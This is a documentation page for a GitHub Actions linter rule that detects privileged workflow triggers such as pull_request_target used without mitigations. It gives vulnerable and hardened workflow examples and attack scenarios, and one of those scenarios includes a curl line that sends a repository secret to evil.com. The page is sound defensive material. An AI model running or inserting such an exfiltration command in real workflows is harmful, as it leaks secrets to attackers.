---
title: "Dangerous Triggers Rule (Critical)"
weight: 45
---

### Dangerous Triggers Rule (Critical) Overview

The `dangerous-triggers-critical` rule detects workflows using **privileged triggers** (pull_request_target, workflow_run, issue_comment, etc.) **without any security mitigations**. This is a critical security risk as these triggers grant elevated privileges that can be exploited by malicious actors.

### Rule ID

`dangerous-triggers-critical`

### Security Impact

**Severity: Critical**

Privileged triggers are dangerous because they:

1. **Grant Write Access**: Can modify repository contents, create releases, etc.
2. **Access Secrets**: Can read repository and organization secrets
3. **Run on Untrusted Input**: Can be triggered by external contributors via PRs or comments
4. **Bypass Branch Protection**: Execute with elevated privileges regardless of branch rules

### Privileged Triggers

| Trigger | Risk | Description |
|---------|------|-------------|
| `pull_request_target` | Critical | Has write access and secrets, triggered by untrusted PRs |
| `workflow_run` | Critical | Executes with elevated privileges after another workflow |
| `issue_comment` | Critical | Triggered by untrusted issue/PR comments |
| `issues` | High | Can be triggered by external users |
| `discussion_comment` | High | Triggered by untrusted discussion comments |

### Detection Logic

The rule checks for privileged triggers and analyzes security mitigations using a scoring system:

| Mitigation | Points | Description |
|------------|--------|-------------|
| Permissions Restriction | +3 | `permissions: read-all` or `permissions: {}` |
| Environment Protection | +2 | Using protected environments with approval |
| Label Condition | +1 | Checking for approved labels like "safe-to-run" |
| Actor Restriction | +1 | Checking `github.actor` or `github.triggering_actor` |
| Fork Check | +1 | Checking `github.event.pull_request.head.repo.fork` |

**Severity Classification:**
- **Critical** (score = 0): No mitigations - immediate risk
- **Medium** (score = 1-2): Minimal mitigations - needs improvement
- **Acceptable** (score >= 3): Adequate mitigations

### Example Vulnerable Workflow

```yaml
name: Auto-Deploy on PR Comment

on:
  issue_comment:
    types: [created]

jobs:
  deploy:
    # CRITICAL: No security mitigations!
    runs-on: ubuntu-latest
    if: contains(github.event.comment.body, '/deploy')
    steps:
      - uses: actions/checkout@v4
      - run: |
          # Has full write access and secrets
          ./deploy.sh
```

**Detection Output:**

```bash
$ sisakulint .github/workflows/deploy.yaml

.github/workflows/deploy.yaml:3:3: dangerous trigger (critical): workflow uses privileged trigger(s) [issue_comment] without any security mitigations. These triggers grant write access and secrets access to potentially untrusted code. Add at least one mitigation: restrict permissions (permissions: read-all or permissions: {}), use environment protection, add label conditions, or check github.actor. See https://sisaku-security.github.io/lint/docs/rules/dangeroustriggersrulecritical/ [dangerous-triggers-critical]
```

### Secure Alternatives

#### 1. Add Permissions Restriction (Recommended)

```yaml
name: Safe Auto-Deploy

on:
  issue_comment:
    types: [created]

# SECURE: Restrict to read-only permissions
permissions: read-all

jobs:
  deploy:
    runs-on: ubuntu-latest
    if: contains(github.event.comment.body, '/deploy')
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
```

#### 2. Use Empty Permissions

```yaml
name: Safe Auto-Deploy

on:
  pull_request_target:
    types: [opened]

# SECURE: No permissions granted
permissions: {}

jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: ./analyze.sh
```

#### 3. Use Environment Protection

```yaml
name: Protected Deploy

on:
  pull_request_target:
    types: [labeled]

jobs:
  deploy:
    runs-on: ubuntu-latest
    # SECURE: Requires environment approval
    environment: production
    if: contains(github.event.pull_request.labels.*.name, 'approved-to-deploy')
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
```

#### 4. Multiple Mitigations (Best Practice)

```yaml
name: Secure PR Processing

on:
  pull_request_target:
    types: [labeled]

# Mitigation 1: Restrict permissions
permissions:
  contents: read
  pull-requests: write

jobs:
  process:
    runs-on: ubuntu-latest
    # Mitigation 2: Environment protection
    environment: pr-processing
    # Mitigation 3: Label check + Fork check
    if: |
      contains(github.event.pull_request.labels.*.name, 'safe-to-process') &&
      github.event.pull_request.head.repo.fork == false
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: ./process-pr.sh
```

### Auto-Fix Support

The rule provides automatic fixes by adding `permissions: {}` to workflows:

```bash
# Preview changes
sisakulint -fix dry-run

# Apply fixes
sisakulint -fix on
```

**Before:**
```yaml
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
```

**After (auto-fixed):**
```yaml
on:
  pull_request_target:
permissions: {}
jobs:
  build:
    runs-on: ubuntu-latest
```

### Attack Scenarios

#### Scenario 1: Secret Exfiltration

```
1. Attacker forks the repository
2. Attacker modifies workflow to add: curl https://evil.com/?secret=${{ secrets.API_KEY }}
3. Attacker opens a PR
4. pull_request_target workflow runs with secrets
5. Secrets are exfiltrated to attacker's server
```

#### Scenario 2: Repository Compromise

```
1. Attacker opens a PR with malicious code
2. Attacker comments "/deploy" on the PR
3. issue_comment workflow triggers with write access
4. Malicious code executes and:
   - Pushes backdoor to main branch
   - Creates malicious release
   - Modifies branch protection rules
```

### Related Rules

- [dangerous-triggers-medium]({{< ref "dangeroustriggersrulemedium.md" >}}): Workflows with partial mitigations
- [code-injection-critical]({{< ref "codeinjectioncritical.md" >}}): Direct code injection in privileged contexts
- [untrusted-checkout]({{< ref "untrustedcheckout.md" >}}): Dangerous checkout patterns
- [permissions]({{< ref "permissions.md" >}}): Permission configuration issues

### References

- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [GitHub: Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [zizmor: Dangerous Triggers](https://docs.zizmor.sh/audits/#dangerous-triggers)
- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)

{{< popup_link2 href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/" >}}

{{< popup_link2 href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions" >}}

{{< popup_link2 href="https://owasp.org/www-project-top-10-ci-cd-security-risks/" >}}
